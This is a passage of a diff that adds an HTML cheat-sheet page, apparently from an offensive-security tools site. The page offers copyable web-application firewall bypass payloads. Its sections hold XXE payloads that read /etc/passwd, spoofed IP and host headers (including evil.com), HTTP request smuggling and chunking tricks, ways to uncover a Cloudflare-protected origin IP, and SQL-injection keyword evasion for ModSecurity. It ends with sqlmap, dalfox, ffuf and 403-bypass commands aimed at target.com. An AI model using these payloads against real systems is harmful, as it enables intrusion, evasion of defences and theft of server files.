+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// CDATA bypass &mdash; CDATA wrapping</span>
+<span class="cmd-line">&lt;![CDATA[&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]]&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SVG XXE &mdash; XXE inside SVG upload</span>
+<span class="cmd-line">&lt;svg xmlns='http://www.w3.org/2000/svg'&gt;&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// XLSX XXE &mdash; XXE via Office file</span>
+<span class="cmd-line">Unzip &gt; edit xl/workbook.xml &gt; inject XXE &gt; rezip</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// XInclude &mdash; XInclude instead of external entity</span>
+<span class="cmd-line">&lt;foo xmlns:xi='http://www.w3.org/2001/XInclude'&gt;&lt;xi:include href='file:///etc/passwd' parse='text'/&gt;&lt;/foo&gt;</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s11" data-cat="s11">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128225;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#00d4ff">HTTP HEADER & PROTOCOL BYPASS</div>
+      <div class="sec-desc">WAFs inspect specific headers and HTTP protocol features. Manipulating these at the protocol level can bypass inspection.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#00d4ff">Header Manipulation</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// X-Forwarded-For spoofing &mdash; Spoof source IP as localhost</span>
+<span class="cmd-line">X-Forwarded-For: 127.0.0.1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// X-Real-IP spoofing &mdash; Alternate IP header</span>
+<span class="cmd-line">X-Real-IP: 127.0.0.1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// X-Originating-IP &mdash; Another IP override header</span>
+<span class="cmd-line">X-Originating-IP: 127.0.0.1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// X-Custom-IP-Authorization &mdash; App-specific IP header</span>
+<span class="cmd-line">X-Custom-IP-Authorization: 127.0.0.1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// True-Client-IP &mdash; CDN passthrough header</span>
+<span class="cmd-line">True-Client-IP: 127.0.0.1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Cluster-Client-IP &mdash; Nginx cluster header</span>
+<span class="cmd-line">Cluster-Client-IP: 127.0.0.1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// CF-Connecting-IP &mdash; Cloudflare origin header</span>
+<span class="cmd-line">CF-Connecting-IP: 127.0.0.1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// X-Host injection &mdash; Host override for SSRF/open redirect</span>
+<span class="cmd-line">X-Host: evil.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// X-Forwarded-Host &mdash; Proxy forwarded host</span>
+<span class="cmd-line">X-Forwarded-Host: evil.com</span>
+</div><div class="group-label" style="color:#00d4ff">Content-Type Manipulation</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// JSON to XML switch &mdash; Switch format to avoid JSON rules</span>
+<span class="cmd-line">Change Content-Type: application/json to application/xml</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// XML to JSON switch &mdash; Same bypass in opposite direction</span>
+<span class="cmd-line">Reverse for XML rules</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Multipart bypass &mdash; WAFs may not parse multipart</span>
+<span class="cmd-line">Wrap payload in multipart/form-data body</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Form urlencoded &mdash; Standard form encoding</span>
+<span class="cmd-line">application/x-www-form-urlencoded with encoded payload</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// text/xml vs application/xml &mdash; Some WAFs only check one</span>
+<span class="cmd-line">Try both content types</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Missing content-type &mdash; WAF may skip inspection if type unknown</span>
+<span class="cmd-line">Remove Content-Type header entirely</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Wrong content-type &mdash; Mismatch — WAF checks text/plain rules</span>
+<span class="cmd-line">Send JSON with Content-Type: text/plain</span>
+</div><div class="group-label" style="color:#00d4ff">HTTP Method Bypass</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Method switching &mdash; WAF rules may differ per method</span>
+<span class="cmd-line">Try POST instead of GET (same payload)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// HEAD request &mdash; Check if HEAD bypasses GET restrictions</span>
+<span class="cmd-line">HEAD /admin</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// OPTIONS request &mdash; CORS preflight — may bypass body inspection</span>
+<span class="cmd-line">OPTIONS / HTTP/1.1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Override header &mdash; Method override for firewalls blocking verbs</span>
+<span class="cmd-line">X-HTTP-Method-Override: GET  (with POST)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Custom method &mdash; Some WAFs only inspect GET/POST</span>
+<span class="cmd-line">FUZZ / HTTP/1.1</span>
+</div><div class="group-label" style="color:#00d4ff">HTTP Version &amp; Protocol</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// HTTP/2 downgrade &mdash; HTTP/1.0 vs HTTP/1.1 parsing differences</span>
+<span class="cmd-line">Use HTTP/1.0 in request</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Chunked encoding &mdash; Payload split between chunks</span>
+<span class="cmd-line">Transfer-Encoding: chunked with payload split across chunks</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Content-Length mismatch &mdash; Front-end/back-end desync</span>
+<span class="cmd-line">Send smaller Content-Length than actual body</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// TE.CL smuggling &mdash; HTTP request smuggling</span>
+<span class="cmd-line">Transfer-Encoding: chunked + smaller Content-Length</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Pipeline bypass &mdash; WAF may only inspect first request</span>
+<span class="cmd-line">Send multiple requests pipelined</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Long URL &mdash; Exceed WAF inspection buffer</span>
+<span class="cmd-line">Add 2000+ chars of junk before payload in query string</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Large body &mdash; WAF may stop inspecting after X bytes</span>
+<span class="cmd-line">Send payload deep into a large POST body</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s12" data-cat="s12">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#9729;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#ff8c00">CLOUDFLARE SPECIFIC BYPASS</div>
+      <div class="sec-desc">Cloudflare-specific WAF bypass techniques. Find origin IP to bypass Cloudflare entirely, or use payload variations to pass its rules.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#ff8c00">Find Origin IP (Bypass Entirely)</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Historical DNS &mdash; Origin may have been exposed before CF</span>
+<span class="cmd-line">Check SecurityTrails / VirusTotal old DNS records</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// MX record leak &mdash; Mail server may be on same IP</span>
+<span class="cmd-line">dig MX target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SPF record &mdash; SPF may list origin IP</span>
+<span class="cmd-line">dig TXT target.com | grep spf</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Subdomain not behind CF &mdash; dev.target.com, staging.target.com</span>
+<span class="cmd-line">Check all subdomains for direct IP</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// shodan cert search &mdash; Find server by TLS cert</span>
+<span class="cmd-line">shodan search ssl.cert.subject.cn:target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// censys cert search &mdash; Same via Censys</span>
+<span class="cmd-line">https://search.censys.io/certificates?q=parsed.subject.common_name%3Atarget.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SSL cert transparency &mdash; Old/admin certs may reveal real IP</span>
+<span class="cmd-line">Check crt.sh for all certs — some may show origin</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Email headers &mdash; Origin server may appear in Received headers</span>
+<span class="cmd-line">Request password reset — look at email headers</span>
+</div><div class="group-label" style="color:#ff8c00">Cloudflare WAF Rule Bypasses</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// CF bypass via TLS 1.3 &mdash; Some CF rules differ on TLS version</span>
+<span class="cmd-line">Use HTTP client with TLS 1.3 only</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// CF IP headers &mdash; Spoof as Cloudflare IP</span>
+<span class="cmd-line">X-Forwarded-For: [CF IP range]</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// CF-ray header removal &mdash; Direct origin access simulation</span>
+<span class="cmd-line">Some backends trust requests without cf-ray</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Uppercase HTTP method &mdash; CF normalizes but backend may not</span>
+<span class="cmd-line">GET vs get — case variation</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// JSON float notation &mdash; Float vs integer parsing difference</span>
+<span class="cmd-line">{'id':1.0}</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Null byte in JSON &mdash; Null in JSON string value</span>
+<span class="cmd-line">{'cmd':'wh\u0000oami'}</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Duplicate params &mdash; CF may check first, backend uses last</span>
+<span class="cmd-line">?q=safe&amp;q=PAYLOAD</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// HPP bypass &mdash; Array notation in params</span>
+<span class="cmd-line">?param[]=value&amp;param[]=PAYLOAD</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s13" data-cat="s13">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128737;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#00ff88">MODSECURITY BYPASS</div>
+      <div class="sec-desc">ModSecurity with OWASP CRS is the most common open-source WAF. These techniques target its rule patterns specifically.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#00ff88">OWASP CRS Evasion</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Bypass SQL keyword &mdash; Random case defeats lowercase regex</span>
+<span class="cmd-line">SeLeCt — CRS checks lowercase patterns</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Score below threshold &mdash; CRS uses scoring — stay below block threshold</span>
+<span class="cmd-line">Craft payload that scores below anomaly threshold</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Divide across params &mdash; Split SQL across multiple parameters</span>
+<span class="cmd-line">?a=UNION&amp;b=SELECT&amp;c=1,2,3</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Use WHERE instead of OR &mdash; WHERE less flagged than OR in auth bypass</span>
+<span class="cmd-line">' WHERE 1=1--  instead of ' OR 1=1--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Avoid comment chars &mdash; -- often triggers rules</span>
+<span class="cmd-line">Use whitespace alternatives instead of --</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Use LIMIT instead of TOP &mdash; Fewer rules on LIMIT keyword</span>
+<span class="cmd-line">MySQL LIMIT  vs MSSQL TOP</span>
+</div><div class="group-label" style="color:#00ff88">ModSecurity Header Tricks</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Bypass via OPTIONS &mdash; Pre-flight bypass</span>
+<span class="cmd-line">OPTIONS request often has fewer rules</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Content-Type bypass &mdash; Wrong content type skips form rules</span>
+<span class="cmd-line">text/html instead of application/x-www-form-urlencoded</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Chunked encoding &mdash; Split payload across chunks</span>
+<span class="cmd-line">Transfer-Encoding: chunked</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Large cookie &mdash; Buffer overflow in header inspection</span>
+<span class="cmd-line">Send payload inside oversized cookie header</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Multipart payload &mdash; Multipart parsing differences</span>
+<span class="cmd-line">Wrap SQLi in multipart form data</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s14" data-cat="s14">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128295;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#b060ff">WAF BYPASS TOOLS</div>
+      <div class="sec-desc">Tools specifically designed for WAF fingerprinting, evasion testing, and automated bypass discovery.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#b060ff">Fingerprinting</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// wafw00f &mdash; Detect WAF vendor from responses</span>
+<span class="cmd-line">wafw00f https://target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// wafw00f all &mdash; Try all fingerprints</span>
+<span class="cmd-line">wafw00f -a https://target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// nmap waf detect &mdash; NSE WAF detection</span>
+<span class="cmd-line">nmap --script http-waf-detect,http-waf-fingerprint -p 80,443 target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// nuclei waf detect &mdash; Nuclei WAF templates</span>
+<span class="cmd-line">nuclei -u https://target.com -t technologies/waf/</span>
+</div><div class="group-label" style="color:#b060ff">Bypass Testing</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// sqlmap tampers &mdash; Multiple tamper scripts</span>
+<span class="cmd-line">sqlmap -u 'URL' --tamper=space2comment,randomcase,charencode</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SQLMap list tampers &mdash; List all available tamper scripts</span>
+<span class="cmd-line">sqlmap --list-tampers</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// dalfox WAF evasion &mdash; XSS with WAF bypass mode</span>
+<span class="cmd-line">dalfox url 'URL' --waf-evasion</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// XSStrike WAF &mdash; Fuzzer mode for WAF bypass</span>
+<span class="cmd-line">python3 xsstrike.py -u 'URL' --fuzzer</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// ffuf WAF bypass &mdash; Fuzz for WAF bypass payloads</span>
+<span class="cmd-line">ffuf -u 'URL?id=FUZZ' -w bypass_payloads.txt -fc 403</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Burp active scan &mdash; Active scan with bypass techniques</span>
+<span class="cmd-line">Right-click &gt; Extensions &gt; Active Scan++ &gt; Scan</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// 403 bypass tool &mdash; Automated 403 page bypass</span>
+<span class="cmd-line">403bypasser -u https://target.com/admin</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// bypass-403 &mdash; Headers + path manipulation for 403</span>
+<span class="cmd-line">python3 bypass-403.py -u https://target.com/admin</span>
+</div><div class="group-label" style="color:#b060ff">Payload Lists</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// PayloadsAllTheThings &mdash; Comprehensive payload repository</span>
+<span class="cmd-line">https://github.com/swisskyrepo/PayloadsAllTheThings</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SecLists WAF &mdash; WAF bypass wordlists</span>
+<span class="cmd-line">https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/WAF</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// WAFNinja &mdash; Automated WAF evasion tool</span>
+<span class="cmd-line">https://github.com/khalilbijjou/WAFNinja</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// GoTestWAF &mdash; WAF testing framework by Wallarm</span>
+<span class="cmd-line">https://github.com/wallarm/gotestwaf</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// waf-bypass &mdash; Awesome WAF collection</span>
+<span class="cmd-line">https://github.com/0xInfection/Awesome-WAF</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// FuzzDB &mdash; Fuzzing payload database</span>
+<span class="cmd-line">https://github.com/fuzzdb-project/fuzzdb</span>
+</div>
+  </div>
+</div>
+</div>
+
+<button id="scrolltop" onclick="window.scrollTo({top:0,behavior:'smooth'})">&#8593;</button>
+
+<footer>
+  <div class="foot-brand">&#128737; BINARYSHIELD</div>
+  <div class="foot-links">
+    <a href="https://binaryshield.in" target="_blank" rel="noopener">Home</a>
+    <a href="https://github.com/binaryshield-in/hacking-tools-scripts" target="_blank" rel="noopener">GitHub</a>
+    <a href="https://binaryshield.in/blog.html" target="_blank" rel="noopener">Blog</a>
+    <a href="mailto:binaryshield.in@gmail.com">Contact</a>
+  </div>
+  <div class="foot-contrib">Want to contribute? &nbsp;<a href="mailto:binaryshield.in@gmail.com">binaryshield.in@gmail.com</a></div>
+</footer>
+
+<script>
+function toggleSec(header){
+  const body=header.nextElementSibling;
+  body.classList.toggle('collapsed');
+  header.classList.toggle('collapsed-hdr',body.classList.contains('collapsed'));
+}
+function expandAll(){
+  document.querySelectorAll('.sec-body').forEach(b=>b.classList.remove('collapsed'));
+  document.querySelectorAll('.sec-header').forEach(h=>h.classList.remove('collapsed-hdr'));
+}
+function collapseAll(){
+  document.querySelectorAll('.sec-body').forEach(b=>b.classList.add('collapsed'));
+  document.querySelectorAll('.sec-header').forEach(h=>h.classList.add('collapsed-hdr'));
+}
+function copyCmd(btn){
+  const line=btn.parentElement.querySelector('.cmd-line');
+  if(!line)return;
+  navigator.clipboard.writeText(line.innerText).then(()=>{
+    btn.textContent='COPIED!';btn.style.color='var(--green)';btn.style.borderColor='var(--green)';
+    setTimeout(()=>{btn.textContent='COPY';btn.style.color='';btn.style.borderColor='';},1800);
+  });
+}
+function doSearch(q){
+  const query=q.toLowerCase().trim();
+  let found=0;
+  document.querySelectorAll('.sec-card').forEach(card=>{
+    const show=!query||card.innerText.toLowerCase().includes(query);
+    card.style.display=show?'':'none';
+    if(show)found++;
+  });
+  document.getElementById('no-results').style.display=(found===0&&query)?'block':'none';
+}
+document.addEventListener('keydown',e=>{
+  const s=document.getElementById('gsearch');
+  if(e.key==='/'&&document.activeElement!==s){e.preventDefault();s.focus();}
+  if(e.key==='Escape'){s.value='';doSearch('');}
+});
+window.addEventListener('scroll',()=>{
+  document.getElementById('scrolltop').classList.toggle('show',window.scrollY>300);
+});
+</script>
+</body>
+</html>
